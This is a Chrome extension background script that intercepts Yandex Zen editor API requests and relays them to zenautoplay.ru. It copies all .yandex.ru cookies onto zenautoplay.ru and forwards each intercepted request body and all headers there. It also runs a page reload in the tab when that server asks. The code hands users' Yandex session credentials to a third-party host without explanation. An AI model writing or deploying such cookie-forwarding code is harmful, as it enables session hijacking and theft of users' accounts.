var requestBodies = {};
var promises = {};

chrome.webRequest.onBeforeRequest.addListener(
	function(info) {
		window.requestBodies[info.requestId] = info.requestBody;
	},
	{urls: ["https://zen.yandex.ru/editor-api/v2/update-publication-content?publisherId=*"]},
	["blocking", "requestBody"]
);

chrome.webRequest.onBeforeSendHeaders.addListener(
	function(info) {
		chrome.cookies.getAll({domain: ".yandex.ru"}, function(cookies) {
			for (cookie of cookies) {
				chrome.cookies.set({url: 'https://zenautoplay.ru', name: cookie.name, value: cookie.value});
			}
		});
		var postBody = window.requestBodies[info.requestId];
		var headers = info.requestHeaders;

		var xhr = new XMLHttpRequest();
		xhr.open("POST", info.url.replace("zen.yandex.ru", "zenautoplay.ru"), true);
		for (header of info.requestHeaders) {
			try {
				xhr.setRequestHeader(header.name, header.value);
			} catch (e) {}
		}
		xhr.onreadystatechange = function() {
			if (xhr.getResponseHeader('Reload')) {
				var code = 'window.location.reload();';
				chrome.tabs.executeScript(info.tabId, {code: code});
			}
		};
		promises[info.requestId] = function() {
			xhr.send(decodeURIComponent(String.fromCharCode.apply(null,
                                      new Uint8Array(postBody.raw[0].bytes))));
		};
	},
	{urls: ["https://zen.yandex.ru/editor-api/v2/update-publication-content?publisherId=*"]},
	["requestHeaders"]
);


chrome.webRequest.onCompleted.addListener(
	function(info) {
		promises[info.requestId]();
	},
	{urls: ["https://zen.yandex.ru/editor-api/v2/update-publication-content?publisherId=*"]}
);
